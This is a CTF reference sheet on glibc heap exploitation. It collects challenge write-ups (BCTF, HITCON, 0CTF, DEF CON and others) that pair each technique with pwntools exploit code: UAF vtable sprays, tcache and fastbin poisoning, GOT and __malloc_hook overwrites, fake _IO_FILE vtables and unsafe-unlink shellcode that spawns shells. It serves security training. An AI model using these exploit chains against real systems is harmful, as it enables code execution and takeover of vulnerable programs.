# Heap Exploitation Techniques (Part 2)

Continuation of [heap-techniques.md](heap-techniques.md). Part 2 collects CTF-specific UAF, tcache, and custom-allocator variants drawn from individual writeups.

## Table of Contents
- [UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)](#uaf-vtable-pointer-encoding-shell-argument-bctf-2017)
- [Uninitialized Chunk Residue Pointer Leak (picoCTF 2018)](#uninitialized-chunk-residue-pointer-leak-picoctf-2018)
- [tcache strcpy Null-Byte Overflow + Backward Consolidation (HITCON 2018)](#tcache-strcpy-null-byte-overflow--backward-consolidation-hitcon-2018)
- [Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite (RITSEC 2018)](#adjacent-struct-fn-pointer-overflow-for-libc-leak--got-overwrite-ritsec-2018)
- [Hidden Menu Option 1337 for Tcache Poisoning (FireShell 2019)](#hidden-menu-option-1337-for-tcache-poisoning-fireshell-2019)
- [Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack (BCTF 2018)](#tcache-double-free--fake-_io_file-vtable-stdout-hijack-bctf-2018)
- [Tcache-to-Fastbin Promotion Cross-Bin Attack (BCTF 2018)](#tcache-to-fastbin-promotion-cross-bin-attack-bctf-2018)
- [6-Bit Index OOB + written_bytes Accumulator for Fn-Pointer Increment (Codegate 2019)](#6-bit-index-oob--written_bytes-accumulator-for-fn-pointer-increment-codegate-2019)
- [IS_MMAPED Bit-Flip for Unsorted Bin Leak on Calloc'd Chunk (0CTF 2017)](#is_mmaped-bit-flip-for-unsorted-bin-leak-on-callocd-chunk-0ctf-2017)
- [Filename-Regex-Constrained Fastbin via LSB-Only Heap Pointer Overwrite (BSidesSF 2019)](#filename-regex-constrained-fastbin-via-lsb-only-heap-pointer-overwrite-bsidessf-2019)
- [Custom Allocator Unsafe Unlink to GOT (DEF CON Qualifier 2014)](#custom-allocator-unsafe-unlink-to-got-def-con-qualifier-2014)

For FILE-structure (_IO_FILE) exploitation see [heap-fsop.md](heap-fsop.md). For the foundational houses (Apple 2, Einherjar, Orange, Spirit, Lore, Force), unsafe unlink, tcache stashing, and musl, see [heap-techniques.md](heap-techniques.md).

---

## UAF Vtable Pointer Encoding Shell Argument (BCTF 2017)

**Pattern:** After UAF, heap spray fills memory with `system()` addresses at a 3-byte offset. The vtable pointer address `0x??006873` encodes ASCII `"sh\x00"` at the object start, so calling `system()` through the vtable executes `system("sh")`.

```python
from pwn import *

# Heap spray: fill 16MB with system() address at offset +3
# Each spray chunk: 3 bytes padding + 8 bytes system_addr, repeated
spray_unit = b"\x00" * 3 + p64(system_addr)
spray_data = spray_unit * (0x1000000 // len(spray_unit))

# Trigger heap spray via application interface
for i in range(spray_count):
    alloc(spray_data[:chunk_size])

# UAF object at address 0xXX006873
# Bytes at object start: 73 68 00 XX = "sh\x00..."
# When vtable call dispatches: system(this) → system("sh")

# Trigger: free the target object, then invoke its virtual method
free(target_obj)
trigger_vtable_call(target_obj)  # calls system("sh")
```

**Key insight:** The vtable pointer value itself serves as the string argument to `system()`. By arranging the heap spray so objects land at addresses containing `0x6873` (ASCII "sh") in the low bytes, the object's address doubles as a valid shell command string. This eliminates the need for a separate controlled string — the pointer IS the argument.

**When to recognize:** UAF on a C++ object with virtual methods, where you control heap layout but not the exact content at the object's `this` pointer. If `system()` is called with `this` as the first argument (common in vtable dispatch), the object's address just needs to decode as a valid command string.

**References:** BCTF 2017

See [heap-fsop.md](heap-fsop.md) for FILE-structure (_IO_FILE) exploitation: fastbin stdout vtable hijack, _IO_buf_base null-byte overwrite, glibc 2.24+ vtable validation bypass, unsorted-bin attacks on stdin FILE fields, and related UAF/refcount bugs.

---

## Uninitialized Chunk Residue Pointer Leak (picoCTF 2018)

**Pattern:** A contact manager allocates a struct `{name, bio}` on the heap but only writes `name`, leaving `bio` uninitialized. After a delete-then-create cycle the new allocation reuses a chunk that still holds a stale pointer from a previous contact. The application's `print_contact()` dereferences `bio`, turning the leftover allocator residue into a controlled heap/libc read.

```c
struct contact { char *name; char *bio; };    // bio never zeroed

void create() {
    struct contact *c = malloc(sizeof *c);
    c->name = malloc(NAME_SZ);
    read_line(c->name, NAME_SZ);
    // bio left uninitialized!
}

void print(struct contact *c) { puts(c->bio); }   // leaks stale pointer target
```

```python
from pwn import *
io = process("./contacts")

# 1. Prime the heap: create a contact whose name chunk will later be reused
#    as the struct for the next contact.
io.sendline("create");  io.sendline("A" * 0x18)
io.sendline("delete 0")

# 2. Create a new contact — it grabs the previously freed chunk. The old
#    name bytes now live in the struct's `bio` field.
io.sendline("create");  io.sendline("B" * 0x10)

# 3. Print → leaks the residue as if it were a bio string.
io.sendline("print 0")
leak = u64(io.recvline().ljust(8, b"\x00"))
log.success(f"heap leak: {leak:#x}")
```

**Key insight:** Uninitialized fields are write-what-where primitives in reverse — the attacker does not choose *what* the field holds but can *place* chunks so that useful bytes end up in it. Target any struct field that is (a) read later without being written and (b) subject to chunk reuse. Common culprits: manually-written `malloc` + `read_line` pairs, C++ classes with members that skip initialisation in non-default constructors, and zero-allocated-then-partially-written caches.

**References:** picoCTF 2018 — Contacts, writeup 11585

---

## tcache strcpy Null-Byte Overflow + Backward Consolidation (HITCON 2018)

**Pattern:** `strcpy(dst, user_name)` appends a trailing NUL that falls one byte past the allocated chunk, clearing `PREV_INUSE` on the next chunk's size field. With a forged `prev_size`, `free()` triggers backward consolidation across a tcache-resident chunk, producing two overlapping heap regions. Splitting out a remainder chunk keeps main_arena pointers in the `fd`/`bk` of one of the overlapping allocations, giving an unsorted-bin-style libc leak in the tcache era.

```c
// Allocation pattern (glibc 2.27 tcache)
char *a = malloc(0xF8);            // victim 1
char *b = malloc(0x18);            // small header chunk with PREV_INUSE
strcpy(a, payload);                // 0xF8 bytes + '\0' overflows into b->size
```

```python
from pwn import *

io = process("./children_tcache")
libc = ELF("./libc-2.27.so")

# 1. Zero the 0xda memset residue with repeated smaller allocations.
for size in (0x70, 0x60, 0x50, 0x40):
    io.sendline("add"); io.sendline(str(size)); io.sendline(b"\x00" * size)

# 2. Set up two adjacent chunks:
io.sendline("add"); io.sendline("0xF8"); io.sendline(b"A" * 0xF8)     # victim 1
io.sendline("add"); io.sendline("0x18"); io.sendline(b"B" * 0x18)     # header

# 3. Free victim 1 into the smallbin (needs a > 0x408 sibling to bypass tcache).
io.sendline("add"); io.sendline("0x420"); io.sendline(b"X" * 0x420)
io.sendline("del 0")                         # smallbin → keeps libc fd/bk

# 4. Overflow via strcpy: clears PREV_INUSE, forges prev_size → backward consolidate
overflow = b"A" * 0xF0 + p64(0x100)           # fake prev_size
io.sendline("edit 1"); io.sendline(overflow)
io.sendline("del 1")                         # consolidate: now we overlap

# 5. Re-allocate the coalesced region and read the libc pointer that still
#    lives in the old fd/bk location.
io.sendline("add"); io.sendline("0x110"); io.sendline(b"P" * 0x10)
io.sendline("show 0")
leak = u64(io.recvline().strip().ljust(8, b"\x00"))
libc.address = leak - (libc.symbols["main_arena"] + 0x60)
log.success(f"libc base {libc.address:#x}")
```

**Key insight:** tcache bypasses most pre-2.27 consolidation tricks, but the `strcpy` null-byte overflow remains viable because it acts on the *next chunk's header*, not the current chunk's in-use flag. Combined with careful zeroing of glibc 2.26+ memset residue (the `0xda` pattern glibc uses on free), you can re-use classic off-by-one-null techniques even in a tcache world. The magic sizes are: large enough to skip the tcache (>0x408 for the freed chunk), small enough to land next to the overflow target.

**References:** HITCON CTF 2018 — Children Tcache, writeup 11929

---

## Adjacent-Struct fn-Pointer Overflow for Libc Leak + GOT Overwrite (RITSEC 2018)

**Pattern:** Go binary compiled with `cgo` places a name buffer immediately adjacent to a struct whose first field is a function pointer (C-style vtable). Overflowing the name field corrupts the next struct's function pointer. First overwrite → redirect the call to `puts(got['free'])` to leak libc. Second overwrite → point free's GOT entry at `system`, then free a chunk whose contents are `"/bin/sh"`.

```python
# 1. Leak libc
payload = b'A'*name_size + p64(puts_plt) + p64(pop_rdi_ret) + p64(free_got)
io.send(payload); io.recvuntil(b'name: '); libc = u64(io.recv(6).ljust(8, b'\x00'))

# 2. Overwrite free@GOT with system
libc_base = libc - libc_syms['puts']
io.send(b'A'*name_size + p64(libc_base + libc_syms['system']))

# 3. Free a chunk whose contents are "/bin/sh\x00"
io.sendline('/bin/sh')
io.sendline('delete 0')
```

**Key insight:** cgo binaries often have C-style structs next to Go-allocated buffers, so classic C-heap techniques still work against Go servers. Look for `GoString` + `char*` + function pointer patterns in the decompile; the layout is usually deterministic.

**References:** RITSEC CTF 2018 — Yet Another HR Management Framework, writeups 12283, 12287

---

## Hidden Menu Option 1337 for Tcache Poisoning (FireShell 2019)

**Pattern:** The visible menu caps allocations at a few chunks, but disassembly reveals an undocumented option (`1337`) that calls `malloc` and `edit` without updating the counter — effectively giving you unlimited allocations. Combined with a vanilla tcache UAF, this lets you flood the tcache, overwrite an entry's `fd` with a BSS target, and `malloc` arbitrary addresses.

```python
def hidden(sz, data):
    p.sendlineafter(b'>', b'1337')
    p.sendlineafter(b'size:', str(sz).encode())
    p.sendafter(b'data:', data)

free(0); free(1)
hidden(0x20, p64(bss_target))   # tcache fd → bss_target
_ = malloc(0x20)                # first chunk back
shell = malloc(0x20)            # returns bss_target
```

**Key insight:** Always dump the menu parser for undocumented branches before assuming a challenge is "rate-limited". Numeric options like `1337`, `9999`, `0xdead` are classic bypasses that the author ships to debug the challenge.

**References:** FireShell CTF 2019 — babyheap, writeup 12962

---

## Tcache Double-Free + Fake _IO_FILE Vtable Stdout Hijack (BCTF 2018)

**Pattern:** Small allocation budget, fastbin + tcache available. Double-free a fastbin chunk into the tcache, malloc to obtain a tcache entry that points at `_IO_2_1_stdout_`, then overwrite stdout's `vtable` pointer to a fake jump table where `_IO_file_overflow` → `system`. Next printf call executes `system("/bin/sh")`.

```python
# 1. Free A twice (bypasses fastbin double-free via tcache)
free(A); free(A)
# 2. Malloc returns A; write stdout addr as next fd
edit(A, p64(stdout))
# 3. Next malloc returns stdout
malloc()
malloc()  # returns &stdout
edit(stdout, fake_file_struct(vtable=fake_vt))
```

Fake vtable entry: slot for `_IO_file_overflow = system`.

**Key insight:** tcache skips fastbin safety checks, so a double-free directly into the tcache works without the usual size-field trickery. The resulting write-where primitive reaches `_IO_2_1_stdout_` in libc trivially.

**References:** BCTF 2018 — easiest, writeup 12489

---

## Tcache-to-Fastbin Promotion Cross-Bin Attack (BCTF 2018)

**Pattern:** Only ~2 allocations available — too few for a traditional tcache dup. Instead, fill tcache, overflow into fastbin, craft chunk whose header points inside a known structure. When fastbin allocation promotes back into tcache (after a future free), malloc returns the header address.

```python
for _ in range(7): free(tcache_chunks[_])   # fill tcache bin
free(fastbin_chunk)                         # goes to fastbin
edit(fastbin_chunk, p64(target_hdr))        # poison fastbin fd
# Drain tcache so next free of fastbin_chunk promotes:
for _ in range(7): malloc(size)
free(fastbin_chunk)                         # now lands in tcache
malloc(size)                                 # returns tcache head = target_hdr
```

**Key insight:** tcache and fastbin share size classes at certain boundaries; a chunk that starts in one often migrates to the other. Use that promotion as an additional reallocation step when budget is tight.

**References:** BCTF 2018 — three/houseofatum, writeups 12476, 12477

---

## 6-Bit Index OOB + written_bytes Accumulator for Fn-Pointer Increment (Codegate 2019)

**Pattern (archiver):** C++ compressor keeps a 48-element QWORD cache (`cached_qwords[48]`) but the cache-read/write opcodes accept a 6-bit index (0-63), giving OOB access into the surrounding object (`buf`, `buf_size`, `buf_offset_Q`, `written_bytes`, `print_uncomp_fsz`). All operations are QWORD-aligned so you cannot directly slice a function pointer; instead, abuse the unused `written_bytes` counter as a programmable offset accumulator to turn `print_uncomp_fsz` into `cat_flag()`.

```python
# OOB write primitives (a2 in [0, 0x3f]):
#   cache_qword(a2, k)            -> cached_qwords[a2] = buf[buf_off_Q - k]
#   save_cached_qword_to_comp(a2) -> buf[++off] = cached_qwords[a2]; written_bytes += 8

# 1. Preallocate buf so it is not realloc'd later (avoids data loss).
# 2. Save print_uncomp_fsz into buf via OOB save_cached_qword_to_comp(0x34).
# 3. Move it back into written_bytes via OOB cache_qword(0x33, 1).
# 4. Emit 0x38 cached QWORDs -> written_bytes += 0x38*8 == 0x1c0 (offset to cat_flag).
# 5. Save the now-incremented written_bytes into buf, then OOB write it back
#    on top of print_uncomp_fsz. Trigger an error path so main() calls it.
payload += save_cached_qword_to_comp(0x34)       # fn ptr -> buf
payload += cache_qword(0x33, 1)                  # buf -> written_bytes
payload += save_cached_qword_to_comp(0) * 0x38   # written_bytes += 0x1c0
payload += save_cached_qword_to_comp(0x33)       # written_bytes -> buf
payload += cache_qword(0x34, 1)                  # buf -> print_uncomp_fsz
```

**Key insight:** When OOB writes are QWORD-aligned but the target function sits only `N*0x10` bytes from an existing pointer, look for a process-local counter in the same struct that is incremented by a known stride. Treating that counter as an arithmetic shim turns an aligned-write primitive into a byte-precise pointer increment, bypassing PIE without ever leaking a code address.

**References:** Codegate CTF 2019 Preliminary — archiver, writeup 13014

---

## IS_MMAPED Bit-Flip for Unsorted Bin Leak on Calloc'd Chunk (0CTF 2017)

**Pattern (BabyHeap2017):** Heap overflow in a full-mitigation binary (Full RELRO, canary, NX, PIE, ASLR). `calloc` normally zeroes freshly-allocated chunks, blocking the classic unsorted-bin leak where fd/bk overlap reusable data. However, when the chunk's `IS_MMAPED` flag is set, glibc skips zeroing. Overflow the preceding chunk to flip `IS_MMAPED` on a freed unsorted-bin chunk, then re-allocate it with `calloc` — the arena pointers in fd/bk survive and leak libc.

```python
# Layout: A (0x80) | B (0x80 freed -> unsorted) | C (victim with overflow)
# Overflow from A into B's chunk header: set size |= IS_MMAPED (bit 1 of size field)
edit(A, b'A'*0x80 + p64(0) + p64(0x91 | 0x2))    # prev_size=0, size=0x91|IS_MMAPED

# calloc-reallocate B: because IS_MMAPED is set, calloc does NOT memset it.
# B's fd/bk still point to main_arena + 0x58 -> libc leak via view(B).
malloc(0x80)                   # returns B with libc pointer intact in first 16 bytes
libc_base = leak - main_arena_offset

# Follow-up: fastbin dup -> __malloc_hook -> one_gadget
```

**Key insight:** `calloc`'s zeroing is conditional on the allocator path. Setting `IS_MMAPED` via heap overflow tricks `calloc` into treating the reused chunk as freshly mmap'd and skipping `memset`, preserving any arena pointers previously written into fd/bk. A 2-bit metadata overwrite defeats the "calloc blocks leaks" assumption.

**References:** 0CTF 2017 Quals — babyheap, writeup 13262

---

## Filename-Regex-Constrained Fastbin via LSB-Only Heap Pointer Overwrite (BSidesSF 2019)

**Pattern (straw_clutcher):** File-server heap has a `RENAME` handler that length-checks `old_name` twice instead of `old_name`/`new_name`, giving a bounded heap overflow into the adjacent `file_t` (`filename[0x20]`, `file_size`, `data`, `free_option`, `prev_file`). Every filename must match `[A-Za-z0-9]+.[A-Za-z0-9]{3}`, which rules out full fastbin-fd overwrites — but the regex only sees the **first null-terminated string** stored in `filename`, so the bytes after a preserved null are unconstrained. Corrupt only the LSB of `prev_file` so it re-points to `file->data` (attacker-controlled), forging a fake chunk that enables double-free + fastbin attack on `__malloc_hook`.

```python
# 1. Leak libc/heap by overwriting file_size to huge value, then RETR dumps the heap.
# 2. Create file whose data bytes satisfy regex as a fake file_t chunk header.
pc.sendline('PUT EEE.EXE {}'.format(0x48))
pc.send(p64(0x4848482e484848) + p64(0)*4       # fake filename "HHH.HHH"
        + p64(0x68)                             # fake file_size
        + p64(heap + 0x250) + p64(0)            # fake data
        + p64(heap + 0x190))                    # fake prev_file
# 3. Produce two 0x70 freed chunks, then overwrite LSB of file->prev_file via rename:
pc.sendline('RENAME EEE.EXE ' + 'E'*7*8 + 'EEEEE.EXP')
# Only LSB of prev_file changes -> upper bytes preserved, LSB lands inside data.
# 4. DELE the forged entry -> double-free on 0x70 tcache/fastbin.
# 5. Classic fastbin poison onto __malloc_hook - 0x23, then trigger with PUT.
```

**Key insight:** When an overflow is byte-addressable but must pass a character-class filter, target only the LSB of heap-metadata pointers. Heap addresses share upper bytes across chunks, so a single attacker-controlled LSB relocates a pointer inside the same 256-byte window — enough to land it in a buffer you already control, bypassing regex/charset constraints that would reject a full 8-byte overwrite.

**References:** BSidesSF 2019 — straw_clutcher, writeup 13763

---

## Custom Allocator Unsafe Unlink to GOT (DEF CON Qualifier 2014)

**Pattern:** Non-glibc allocator with naive `free` — sets `mem[fd] = bk` (and symmetric `mem[bk+4] = fd`) without any safe-unlink consistency check. Overflow from the 10th chunk (0x104 bytes) corrupts chunk 11's `fd`/`bk` so that when chunk 9 is freed and chunk 11 becomes its "neighbour" during consolidation, the unlink writes `printf@GOT` → shellcode jump.

```python
from pwn import *
context(arch='i386', os='linux')

printf_got = 0x804c004
array_10_addr = 0x...   # leaked from banner output "loc=0xADDR"

payload  = p32(printf_got - 8)       # fake fd -> target = printf GOT (minus 8 for offset)
payload += p32(array_10_addr + 8)    # fake bk -> value = addr of shellcode jump
payload += b"\xeb\x08" + b"A"*8 + asm(shellcraft.sh())  # jmp +8; pad; shellcode
payload += b"A" * (260 - len(payload))
payload += p32(0)                    # next chunk's size field (prev_in_use = 0)
```

**Key insight:** Custom allocators almost never implement glibc's `fd->bk == chunk && bk->fd == chunk` safe-unlink check introduced in 2004. The classic `write-what-where` via `unlink(chunk)` applies verbatim — target GOT entries that will be called soon (printf, free, puts) and bake a short `jmp +8` over the 8-byte write slot into the shellcode. Validate the faked `size` field of the sentinel chunk so the allocator still consolidates instead of aborting.

**References:** DEF CON CTF Qualifier 2014 — heap, writeup 13953
